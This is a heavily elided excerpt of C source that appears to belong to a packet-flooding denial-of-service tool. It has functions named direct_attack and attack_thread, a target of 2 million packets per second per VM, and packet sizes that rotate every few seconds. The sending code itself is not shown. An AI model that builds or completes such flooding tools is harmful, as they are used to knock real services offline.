...
_Atomic int global_packet_size = 60;
...
int get_base_burst(int packet_size) {
    if (packet_size <= 120) return 32;
    if (packet_size <= 256) return 28;
    return 24;
}
...
void *direct_attack(void *arg) {
    ...
    int base_burst = get_base_burst(60); // base for 60-120 range
    int target_pps = 2000000; // 2M PPS target per VM
    ...
    while (!atomic_load(&stop_signal)) {
        ...
        if (current_elapsed % 5 == 0 && current_elapsed > last_rotation) {
            ...
            if (thread_idx % 5 == 0) {
                ...
                int new_size = sizes[fast_rand(&rotation_seed) % 31];
...
void *attack_thread(void *arg) {
    ...
    int base_burst = get_base_burst(60);
    int target_pps = 2000000;
...
int main(int argc, char *argv[]) {
    ...
    atomic_store(&global_packet_size, 60);
